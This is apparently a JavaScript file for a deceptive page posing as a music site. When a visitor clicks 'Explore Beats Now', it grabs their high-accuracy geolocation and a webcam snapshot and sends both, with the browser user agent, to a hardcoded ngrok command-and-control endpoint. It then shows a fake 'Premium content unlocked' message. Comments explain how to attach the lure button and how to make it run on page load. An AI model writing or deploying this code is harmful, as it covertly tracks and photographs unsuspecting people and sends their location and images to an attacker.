// This URL will be your ngrok public URL pointing to your Python C2 server.
// Example: "https://your-ngrok-id.ngrok-free.app/data"
// *** REMEMBER TO UPDATE THIS LINE WITH YOUR CURRENT NGROK HTTPS URL + /data ***
const C2_ENDPOINT = 'https://spidery-eddie-nontemperable.ngrok-free.dev//data'; 

// Function to get geolocation
function getGeolocation() {
    return new Promise((resolve, reject) => {
        if ("geolocation" in navigator) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    resolve({
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        timestamp: new Date(position.timestamp).toISOString()
                    });
                },
                (error) => {
                    console.error("Geolocation error:", error);
                    reject(new Error(`Geolocation error: ${error.message} (Code: ${error.code})`));
                },
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        } else {
            reject(new Error("Geolocation is not supported by this browser."));
        }
    });
}

// Function to capture image from camera
async function captureImage() {
    const video = document.getElementById('webcamFeed');
    const canvas = document.getElementById('cameraCanvas');
    const context = canvas.getContext('2d');

    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        await video.play();

        // Ensure video is playing and dimensions are set
        // Adding a small delay to ensure video stream is fully ready for some browsers
        await new Promise(r => setTimeout(r, 200)); 

        // Set canvas dimensions to match video stream if not already set by onloadedmetadata
        if (canvas.width === 0 || canvas.height === 0) {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
        }

        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        const imageDataUrl = canvas.toDataURL('image/jpeg', 0.8); // 80% quality JPEG

        // Stop the camera stream to turn off the light
        stream.getTracks().forEach(track => track.stop());
        video.srcObject = null; // Clear the source object
        
        return imageDataUrl;
    } catch (err) {
        console.error("Camera access or capture error:", err);
        throw new Error(`Camera error: ${err.message}`);
    }
}

// Function to send data to C2
async function sendDataToC2(data) {
    try {
        const response = await fetch(C2_ENDPOINT, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data),
        });

        if (!response.ok) {
            // Log the full response for better debugging
            const errorBody = await response.text();
            console.error(`HTTP error! status: ${response.status}, response: ${errorBody}`);
            throw new Error(`HTTP error! status: ${response.status} - ${errorBody}`);
        }

        const result = await response.json();
        console.log("Data sent to C2 successfully:", result);
    } catch (error) {
        console.error("Failed to send data to C2:", error);
        // More robust error handling: e.g., send error data back to C2, or retry
    }
}

// Main function to initiate the capture process
async function initiateCapture() {
    document.getElementById('loadingMessage').style.display = 'block';

    let locationData = null;
    let imageData = null;
    let errors = [];

    // Attempt to get geolocation
    try {
        console.log("Attempting to get geolocation...");
        locationData = await getGeolocation();
        console.log("Geolocation obtained:", locationData);
    } catch (err) {
        errors.push(err.message);
        console.warn("Could not get geolocation:", err.message);
    }

    // Attempt to capture image
    try {
        console.log("Attempting to capture image...");
        imageData = await captureImage();
        console.log("Image captured (base64 length):", imageData ? imageData.length : "N/A");
    } catch (err) {
        errors.push(err.message);
        console.warn("Could not capture image:", err.message);
    }

    const payload = {
        location: locationData,
        image: imageData,
        userAgent: navigator.userAgent,
        timestamp: new Date().toISOString(),
        clientErrors: errors.length > 0 ? errors : "none"
    };

    console.log("Sending payload to C2:", payload);
    await sendDataToC2(payload);

    document.getElementById('loadingMessage').style.display = 'none';
    alert("Premium content unlocked! Enjoy the beats!"); // User feedback
}

// --- CRUCIAL INTEGRATION ---
// This ensures that clicking the button calls the initiateCapture function.
// Also, verify this button exists in your index.html:
// <button class="cta-button" onclick="initiateCapture()">Explore Beats Now</button>
// If you want it to run automatically on page load (less subtle):
// document.addEventListener('DOMContentLoaded', initiateCapture); 
